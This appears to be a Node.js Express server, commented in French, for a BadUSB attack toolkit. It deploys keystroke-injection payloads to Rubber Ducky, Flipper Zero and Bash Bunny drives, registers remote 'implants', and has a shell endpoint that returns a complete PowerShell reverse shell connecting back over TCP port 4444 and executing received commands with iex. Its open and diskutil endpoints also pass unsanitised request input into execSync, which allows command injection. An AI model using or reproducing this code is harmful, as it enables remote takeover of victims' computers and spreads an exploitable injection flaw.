// server/api.js
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const { execSync } = require('child_process');

app.use(cors());
app.use(express.json());
app.use('/static', express.static('payloads'));

// Compilation Rubber Ducky
app.post('/compile', (req, res) => {
    const { name, payload } = req.body;
    const duckyCode = payload || '';
    try {
        if (!fs.existsSync('./payloads')) fs.mkdirSync('./payloads');
        const txtPath = `./payloads/${name}.txt`;
        fs.writeFileSync(txtPath, duckyCode, 'utf8');
        res.json({ success: true, path: txtPath });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Détection des volumes et Rubber Ducky
function detectVolumes() {
    try {
        const base = '/Volumes';
        const names = fs.readdirSync(base);
        return names.map(name => {
            const mount = path.join(base, name);
            let type = 'storage';
            const lower = name.toLowerCase();
            if (lower.includes('duck') || lower.includes('rubber')) type = 'rubberducky';
            else if (lower.includes('flipper')) type = 'flipper';
            else if (lower.includes('bunny') || lower.includes('bash')) type = 'bashbunny';
            const hasInject = fs.existsSync(path.join(mount, 'inject.bin'));
            const hasPayloadTxt = fs.existsSync(path.join(mount, 'payload.txt'));
            const hasBadUsbDir = fs.existsSync(path.join(mount, 'badusb'));
            const hasBashBunnyPayloads = fs.existsSync(path.join(mount, 'payloads'));
            return { name, mountpoint: mount, type, hasInject, hasPayloadTxt };
        });
    } catch (e) {
        return [];
    }
}

app.get('/hardware/list', (req, res) => {
    const volumes = detectVolumes();
    res.json({ success: true, volumes });
});

app.post('/rubberducky/deploy', (req, res) => {
    const { payload } = req.body;
    if (!payload || typeof payload !== 'string') {
        return res.status(400).json({ success: false, error: 'Payload manquant' });
    }
    let mount = null;
    const volumes = detectVolumes();
    const duck = volumes.find(v => v.type === 'rubberducky') || volumes.find(v => v.hasInject || v.hasPayloadTxt);
    if (duck) mount = duck.mountpoint;
    if (!mount) {
        return res.status(404).json({ success: false, error: 'Rubber Ducky introuvable (aucun volume /Volumes/* correspondant)' });
    }
    try {
        const targetPayload = path.join(mount, 'payload.txt');
        fs.writeFileSync(targetPayload, payload, 'utf8');
        res.json({ success: true, mountpoint: mount, path: targetPayload });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.post('/flipper/deploy', (req, res) => {
    const { payload, name } = req.body;
    if (!payload || typeof payload !== 'string') {
        return res.status(400).json({ success: false, error: 'Payload manquant' });
    }
    const volumes = detectVolumes();
    const flip = volumes.find(v => v.type === 'flipper');
    if (!flip) {
        return res.status(404).json({ success: false, error: 'Flipper Zero introuvable' });
    }
    try {
        const folder = path.join(flip.mountpoint, 'badusb');
        if (!fs.existsSync(folder)) fs.mkdirSync(folder);
        const fileName = (name && String(name).trim().length > 0 ? name : 'payload') + '.txt';
        const target = path.join(folder, fileName);
        fs.writeFileSync(target, payload, 'utf8');
        res.json({ success: true, mountpoint: flip.mountpoint, path: target });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

app.post('/bashbunny/deploy', (req, res) => {
    const { payload, slot } = req.body;
    if (!payload || typeof payload !== 'string') {
        return res.status(400).json({ success: false, error: 'Payload manquant' });
    }
    const volumes = detectVolumes();
    const bunny = volumes.find(v => v.type === 'bashbunny');
    if (!bunny) {
        return res.status(404).json({ success: false, error: 'Bash Bunny introuvable' });
    }
    try {
        const s = ['switch1', 'switch2', 'switch3'].includes(slot) ? slot : 'switch1';
        const payloadsDir = path.join(bunny.mountpoint, 'payloads', s);
        if (!fs.existsSync(payloadsDir)) fs.mkdirSync(payloadsDir, { recursive: true });
        const target = path.join(payloadsDir, 'payload.txt');
        fs.writeFileSync(target, payload, 'utf8');
        res.json({ success: true, mountpoint: bunny.mountpoint, path: target });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Ouvrir le volume dans Finder
app.post('/hardware/open', (req, res) => {
    const { mountpoint } = req.body;
    if (!mountpoint || typeof mountpoint !== 'string') {
        return res.status(400).json({ success: false, error: 'Mountpoint manquant' });
    }
    try {
        execSync(`open "${mountpoint}"`);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Éjecter le volume (macOS)
app.post('/hardware/eject', (req, res) => {
    const { mountpoint } = req.body;
    if (!mountpoint || typeof mountpoint !== 'string') {
        return res.status(400).json({ success: false, error: 'Mountpoint manquant' });
    }
    try {
        // Tente l'éjection directe, sinon unmount
        try { execSync(`diskutil eject "${mountpoint}"`); }
        catch { execSync(`diskutil unmount "${mountpoint}"`); }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Gestion implants distants
app.post('/implant/register', (req, res) => {
    const { id, ip, status } = req.body;
    const implants = JSON.parse(fs.readFileSync('implants.json', 'utf8'));
    implants[id] = { ip, status, last_seen: Date.now() };
    fs.writeFileSync('implants.json', JSON.stringify(implants));
    res.json({ success: true });
});

// Shell distant
app.post('/shell/:id/execute', (req, res) => {
    const { command } = req.body;
    // Implémente PowerShell reverse shell
    const ps1 = `
    $client = New-Object System.Net.Sockets.TCPClient('${req.ip}', 4444);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
    $client.Close();
    `;
    
    res.json({ payload: ps1 });
});

app.listen(3001, () => console.log('API: http://localhost:3001'));